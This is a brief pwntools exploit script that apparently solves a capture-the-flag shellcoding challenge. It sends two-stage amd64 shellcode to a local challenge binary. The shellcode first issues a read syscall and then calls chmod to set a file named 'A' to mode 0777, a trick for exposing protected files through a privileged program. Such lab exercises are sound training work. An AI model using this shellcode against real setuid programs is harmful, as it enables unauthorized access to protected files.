from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

# assembly goes here, most of the rest is boilerplate
assembly = f"""
push rax
pop rdi
push rdx
pop rsi
syscall
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
xor esi, esi
mul esi
mov al, 90
push 0x41
push rsp
pop rdi
mov si, 0x1ff
syscall
"""

# the hostname will always be the same as challenge binary
with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
